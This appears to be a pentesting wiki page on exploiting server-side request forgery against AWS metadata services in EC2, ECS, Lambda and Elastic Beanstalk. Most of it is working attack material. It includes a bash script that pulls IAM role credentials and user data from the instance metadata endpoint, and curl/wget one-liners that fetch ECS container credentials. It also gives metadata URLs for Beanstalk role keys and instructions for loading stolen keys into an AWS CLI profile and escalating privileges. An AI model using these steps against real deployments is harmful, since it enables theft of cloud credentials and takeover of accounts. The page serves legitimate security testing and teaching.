# Cloud SSRF - AWS

## AWS

### Abusing SSRF in AWS EC2 environment

**The metadata** endpoint can be accessed from inside any EC2 machine and offers interesting information about it. It's accesible in the url: `http://169.254.169.254` ([information about the metadata here](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)).

There are **2 versions** of the metadata endpoint. The **first** one allows to **access** the endpoint via **GET** requests (so any **SSRF can exploit it**). For the **version 2**, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), you need to ask for a **token** sending a **PUT** request with a **HTTP header** and then use that token to access the metadata with another HTTP header (so it's **more complicated to abuse** with a SSRF).

> [!CAUTION]
> Note that if the EC2 instance is enforcing IMDSv2, [**according to the docs**](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html), the **response of the PUT request** will have a **hop limit of 1**, making impossible to access the EC2 metadata from a container inside the EC2 instance.
>
> Moreover, **IMDSv2** will also **block requests to fetch a token that include the `X-Forwarded-For` header**. This is to prevent misconfigured reverse proxies from being able to access it.

You can find information about the [metadata endpoints in the docs](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html). In the following script some interesting information is obtained from it:

```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
    aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
    aws_req="wget -q -O - -H '$HEADER'"
else
    echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do
  echo "Mac: $mac"
  printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
  printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
  printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
  echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
  printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
  echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
  printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
  echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
  echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do
  echo "Role: $role"
  eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
  echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```

As a **publicly available IAM credentials** exposed example you can visit: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

You can also check public **EC2 security credentials** in: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

You can then take **those credentials and use them with the AWS CLI**. This will allow you to do **anything that role has permissions** to do.

To take advantage of the new credentials, you will need to crate a new AWS profile like this one:

```
[profilename]
aws_access_key_id = ASIA6GG71[...]
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT[...]
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```

Notice the **aws_session_token**, this is indispensable for the profile to work.

[**PACU**](https://github.com/RhinoSecurityLabs/pacu) can be used with the discovered credentials to find out your privileges and try to escalate privileges

### SSRF in AWS ECS (Container Service) credentials

**ECS**, is a logical group of EC2 instances on which you can run an application without having to scale your own cluster management infrastructure because ECS manages that for you. If you manage to compromise service running in **ECS**, the **metadata endpoints change**.

If you access _**http://169.254.170.2/v2/credentials/\<GUID>**_ you will find the credentials of the ECS machine. But first you need to **find the \<GUID>**. To find the \<GUID> you need to read the **environ** variable **AWS_CONTAINER_CREDENTIALS_RELATIVE_URI** inside the machine.\
You could be able to read it exploiting an **Path Traversal** to `file:///proc/self/environ`\
The mentioned http address should give you the **AccessKey, SecretKey and token**.

```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```

> [!TIP]
> Note that in **some cases** you will be able to access the **EC2 metadata instance** from the container (check IMDSv2 TTL limitations mentioned previously). In these scenarios from the container you could access both the container IAM role and the EC2 IAM role.

### SSRF for AWS Lambda

In this case the **credentials are stored in env variables**. So, to access them you need to access something like **`file:///proc/self/environ`**.

The **name** of the **interesting env variables** are:

- `AWS_SESSION_TOKEN`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_ACCES_KEY_ID`

Moreover, in addition to IAM credentials, Lambda functions also have **event data that is passed to the function when it is started**. This data is made available to the function via the [runtime interface](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) and could contain **sensitive** **information** (like inside the **stageVariables**). Unlike IAM credentials, this data is accessible over standard SSRF at **`http://localhost:9001/2018-06-01/runtime/invocation/next`**.

> [!WARNING]
> Note that **lambda credentials** are inside the **env variables**. So if the **stack trace** of the lambda code prints env vars, it's possible to **exfiltrate them provoking an error** in the app.

### SSRF URL for AWS Elastic Beanstalk

We retrieve the `accountId` and `region` from the API.

```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

We then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

![](https://miro.medium.com/max/60/0*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0*4OG-tRUNhpBK96cL)

Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
